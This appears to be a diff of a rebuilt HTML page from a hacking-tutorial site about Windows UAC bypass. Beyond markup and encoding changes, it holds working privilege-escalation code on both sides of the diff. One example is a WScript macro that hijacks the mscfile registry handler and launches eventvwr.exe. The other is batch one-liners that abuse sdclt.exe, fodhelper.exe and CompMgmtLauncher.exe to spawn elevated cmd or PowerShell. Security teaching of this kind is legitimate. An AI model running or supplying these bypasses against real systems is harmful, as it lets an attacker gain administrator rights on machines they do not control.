@@ -4,9 +4,9 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="UAC Bypass #  Vulnerable programs #  CompMgmtLauncher.exe #  eventvwr.exe #   Windows 7/8/10 HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command = &quot;cmd.exe&quot;  sdclt.exe #   Windows 10 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe = &quot;cmd.exe&quot;  fodhelper.exe #   Windows 10 HKCU\Software\Classes\ms-settings\shell\open\command = &quot;DelegateExecute&quot; HKCU\Software\Classes\ms-settings\shell\open\command = &quot;cmd.exe&quot;  Examples #  WScript Example &#39; Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506 &#39; Sleep is caught (may use ping instead?) &#39; Obfusc may be needed Private Declare Sub Sleep Lib &quot;kernel32&quot; (ByVal dwMilliseconds As Long) Private Sub CommandButton1_Click() Set WSobj = CreateObject(&quot;WScript.">
+<meta name="description" content="UAC Bypass #  Vulnerable programs #  CompMgmtLauncher.exe #  eventvwr.exe #   Windows 7/8/10 HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command = &quot;cmd.exe&quot;  sdclt.exe #   Windows 10 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe = &quot;cmd.exe&quot;  fodhelper.exe #   Windows 10 HKCU\Software\Classes\ms-settings\shell\open\command = &quot;DelegateExecute&quot; HKCU\Software\Classes\ms-settings\shell\open\command = &quot;cmd.exe&quot;  Examples #  WScript Example &#39; Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506 &#39; Sleep is caught (may use ping instead?) &#39; Obfusc may be needed Private Declare Sub Sleep Lib &#34;kernel32&#34; (ByVal dwMilliseconds As Long) Private Sub CommandButton1_Click() Set WSobj = CreateObject(&#34;WScript.">
 <meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="UAC Bypass" />
-<meta property="og:description" content="UAC Bypass #  Vulnerable programs #  CompMgmtLauncher.exe #  eventvwr.exe #   Windows 7/8/10 HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command = &quot;cmd.exe&quot;  sdclt.exe #   Windows 10 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe = &quot;cmd.exe&quot;  fodhelper.exe #   Windows 10 HKCU\Software\Classes\ms-settings\shell\open\command = &quot;DelegateExecute&quot; HKCU\Software\Classes\ms-settings\shell\open\command = &quot;cmd.exe&quot;  Examples #  WScript Example &#39; Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506 &#39; Sleep is caught (may use ping instead?) &#39; Obfusc may be needed Private Declare Sub Sleep Lib &quot;kernel32&quot; (ByVal dwMilliseconds As Long) Private Sub CommandButton1_Click() Set WSobj = CreateObject(&quot;WScript." />
+<meta property="og:description" content="UAC Bypass #  Vulnerable programs #  CompMgmtLauncher.exe #  eventvwr.exe #   Windows 7/8/10 HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command = &quot;cmd.exe&quot;  sdclt.exe #   Windows 10 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe = &quot;cmd.exe&quot;  fodhelper.exe #   Windows 10 HKCU\Software\Classes\ms-settings\shell\open\command = &quot;DelegateExecute&quot; HKCU\Software\Classes\ms-settings\shell\open\command = &quot;cmd.exe&quot;  Examples #  WScript Example &#39; Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506 &#39; Sleep is caught (may use ping instead?) &#39; Obfusc may be needed Private Declare Sub Sleep Lib &#34;kernel32&#34; (ByVal dwMilliseconds As Long) Private Sub CommandButton1_Click() Set WSobj = CreateObject(&#34;WScript." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://brimstone.github.io/learn-hacking/docs/windows/privilege-escalation/uac/" /><meta property="article:section" content="docs" />
 
@@ -16,7 +16,7 @@
 <link rel="manifest" href="../../../../manifest.json">
 <link rel="icon" href="../../../../favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="../../../../book.min.601a93ba058c3e9d2332392f9a4cef5a1a269e08edd2b44f6885e02ddf096460.css" integrity="sha256-YBqTugWMPp0jMjkvmkzvWhomngjt0rRPaIXgLd8JZGA=">
-<script defer src="../../../../en.search.min.fe51eb942afdefba50d8e6dade9adede5b9041df5c17b5476c09dff69d9cb4f7.js" integrity="sha256-/lHrlCr977pQ2Oba3pre3luQQd9cF7VHbAnf9p2ctPc="></script>
+<script defer src="../../../../en.search.min.469017830c888301fd1f9852b0beeee6c253758581e05da0639bbd0429c824a1.js" integrity="sha256-RpAXgwyIgwH9H5hSsL7u5sJTdYWB4F2gY5u9BCnIJKE="></script>
 
 <script defer src="../../../../sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk="></script>
 <!--
@@ -414,7 +414,7 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-  <script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+  <script>(function(){var e=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
  
@@ -511,22 +511,21 @@ https://github.com/alex-shpak/hugo-book
 <details >
   <summary>WScript Example</summary>
   <div class="markdown-inner">
-    <pre><code class="language-wscript" data-lang="wscript">' Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506
-' Sleep is caught (may use ping instead?)
-' Obfusc may be needed
-Private Declare Sub Sleep Lib &quot;kernel32&quot; (ByVal dwMilliseconds As Long)
+    <pre tabindex="0"><code class="language-wscript" data-lang="wscript">&#39; Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506
+&#39; Sleep is caught (may use ping instead?)
+&#39; Obfusc may be needed
+Private Declare Sub Sleep Lib &#34;kernel32&#34; (ByVal dwMilliseconds As Long)
 Private Sub CommandButton1_Click()
-   Set WSobj = CreateObject(&quot;WScript.Shell&quot;)
-   WSobj.RegWrite &quot;HKCU\Software\Classes\mscfile\shell\open\command\&quot;, &quot;&quot;
-   WSobj.RegWrite &quot;HKCU\Software\Classes\mscfile\shell\open\command\&quot;, &quot;C:\windows\system32\cmd.exe&quot;, &quot;REG_SZ&quot;
-   WSobj.Run (&quot;C:\Windows\System32\eventvwr.exe&quot;)
+   Set WSobj = CreateObject(&#34;WScript.Shell&#34;)
+   WSobj.RegWrite &#34;HKCU\Software\Classes\mscfile\shell\open\command\&#34;, &#34;&#34;
+   WSobj.RegWrite &#34;HKCU\Software\Classes\mscfile\shell\open\command\&#34;, &#34;C:\windows\system32\cmd.exe&#34;, &#34;REG_SZ&#34;
+   WSobj.Run (&#34;C:\Windows\System32\eventvwr.exe&#34;)
    Sleep 2000
-   WSobj.RegDelete &quot;HKCU\Software\Classes\mscfile\shell\open\command\&quot;
-   WSobj.RegDelete &quot;HKCU\Software\Classes\mscfile\shell\open\&quot;
-   WSobj.RegDelete &quot;HKCU\Software\Classes\mscfile\shell\&quot;
-   WSobj.RegDelete &quot;HKCU\Software\Classes\mscfile\&quot;
+   WSobj.RegDelete &#34;HKCU\Software\Classes\mscfile\shell\open\command\&#34;
+   WSobj.RegDelete &#34;HKCU\Software\Classes\mscfile\shell\open\&#34;
+   WSobj.RegDelete &#34;HKCU\Software\Classes\mscfile\shell\&#34;
+   WSobj.RegDelete &#34;HKCU\Software\Classes\mscfile\&#34;
 End Sub
-
 </code></pre><p><i>Source: <a href="../../../../examples/windows/privilege-escalation/uac-bypass.vbs">uac-bypass.vbs</a></i></p>
 
   </div>
@@ -535,18 +534,17 @@ End Sub
 <details >
   <summary>Batch Example</summary>
   <div class="markdown-inner">
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch"><span style="color:#75715e">REM Credits to https://gist.github.com/xillwillx/39e5cccc846d5b5a475bbad48216a5a7</span>
-
-**UAC bypass for Win10:**
-reg add <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&#34;</span> /d <span style="color:#e6db74">&#34;cmd.exe&#34;</span> /f &amp;&amp; <span style="color:#66d9ef">START</span> /W sdclt.exe &amp;&amp; reg delete <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&#34;</span> /f
-
-**UAC bypass for Win10:**
-reg add HKCU\Software\Classes\ms-settings\shell\open\command /v <span style="color:#e6db74">&#34;DelegateExecute&#34;</span> /f &amp;&amp; reg add HKCU\Software\Classes\ms-settings\shell\open\command /d <span style="color:#e6db74">&#34;cmd /c start powershell.exe&#34;</span> /f &amp;&amp; <span style="color:#66d9ef">START</span> /W fodhelper.exe &amp;&amp; reg delete HKCU\Software\Classes\ms-settings /f
-
-**UAC bypass for 7/8/10:**
-reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d <span style="color:#e6db74">&#34;cmd.exe&#34;</span> /f &amp;&amp; <span style="color:#66d9ef">START</span> /W CompMgmtLauncher.exe &amp;&amp; reg delete HKEY_CURRENT_USER\Software\Classes\mscfile /f
-
-</code></pre></div><p><i>Source: <a href="../../../../examples/windows/privilege-escalation/uac-bypass.bat">uac-bypass.bat</a></i></p>
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span><span style="color:#75715e">REM Credits to https://gist.github.com/xillwillx/39e5cccc846d5b5a475bbad48216a5a7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**UAC bypass for Win10:**
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&#34;</span> /d <span style="color:#e6db74">&#34;cmd.exe&#34;</span> /f &amp;&amp; <span style="color:#66d9ef">START</span> /W sdclt.exe &amp;&amp; reg delete <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&#34;</span> /f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**UAC bypass for Win10:**
+</span></span><span style="display:flex;"><span>reg add HKCU\Software\Classes\ms-settings\shell\open\command /v <span style="color:#e6db74">&#34;DelegateExecute&#34;</span> /f &amp;&amp; reg add HKCU\Software\Classes\ms-settings\shell\open\command /d <span style="color:#e6db74">&#34;cmd /c start powershell.exe&#34;</span> /f &amp;&amp; <span style="color:#66d9ef">START</span> /W fodhelper.exe &amp;&amp; reg delete HKCU\Software\Classes\ms-settings /f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**UAC bypass for 7/8/10:**
+</span></span><span style="display:flex;"><span>reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d <span style="color:#e6db74">&#34;cmd.exe&#34;</span> /f &amp;&amp; <span style="color:#66d9ef">START</span> /W CompMgmtLauncher.exe &amp;&amp; reg delete HKEY_CURRENT_USER\Software\Classes\mscfile /f
+</span></span></code></pre></div><p><i>Source: <a href="../../../../examples/windows/privilege-escalation/uac-bypass.bat">uac-bypass.bat</a></i></p>
 
   </div>
 </details>
